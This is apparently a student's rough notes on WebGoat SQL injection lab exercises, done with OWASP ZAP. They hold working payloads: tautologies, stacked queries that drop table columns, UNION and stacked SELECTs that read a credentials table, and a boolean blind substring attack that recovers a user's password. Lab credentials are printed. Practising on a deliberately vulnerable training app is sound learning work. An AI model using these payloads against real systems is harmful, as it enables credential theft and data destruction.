java11 owasp zap wegoat 8

> ./zap.sh
> java -jar NAMEJAR --server.port=8081

access from localhost:80801/webgoat/attack
123456 password

# intermediate
### ex3 
"""
 ' or '1'='1
"""

"""
SELECT * FROM user_data WHERE last_name = 'PLACEHOLDER'
SELECT * FROM user_data WHERE last_name = ' @' or '1'=1@ '
"""
it enables me to see all the user_data TABLE

The password column in the other table is restricted.

So I try to make an UNION between the to tables.
In order to make the union I have to have the same number of column. 
So I remove some column from the user_data table.

"""
'; ALTER TABLE user_data DROP COLUMN login_count --
'; ALTER TABLE user_data DROP COLUMN first_name --
'; ALTER TABLE user_data DROP COLUMN cc_number --
"""

at this point I'm able to UNION the to tabwles
"""
' UNION SELECT * FROM user_system_data -- 
"""

'; SELECT * FROM user_system_data; -- 
funziona


and I'm able to see user_id user_name and password from the user_system_data 
101, jsnow, passwd1, ,
102, jdoe, passwd2, ,
103, jplane, passwd3, ,
104, jeff, jeff, ,
105, dave, passW0rD, ,


So dave's password is "passW0rD"


### ex5 
Tom

> register new user 'user'
GOOD

user' AND '1'='1
> register new user " user' AND '1'='1 "

usando owasp zap
user' AND substring(password,1,1)='t

username_reg=tom'+AND+substring(password%2C1%2C23)%3D'thisisasecretfortomonly&email_reg=user%40user.it&password_reg=user&confirm_password_reg=user
thisisasecretfortomonly
 
User user' AND substring(password,1,1)='u already exists please try to register with a different username.
This mean that the server looks if 'user' exist in the database, if true than it exists
By this info i alos know that this input form i suitable to sql injection

creo una nuova 

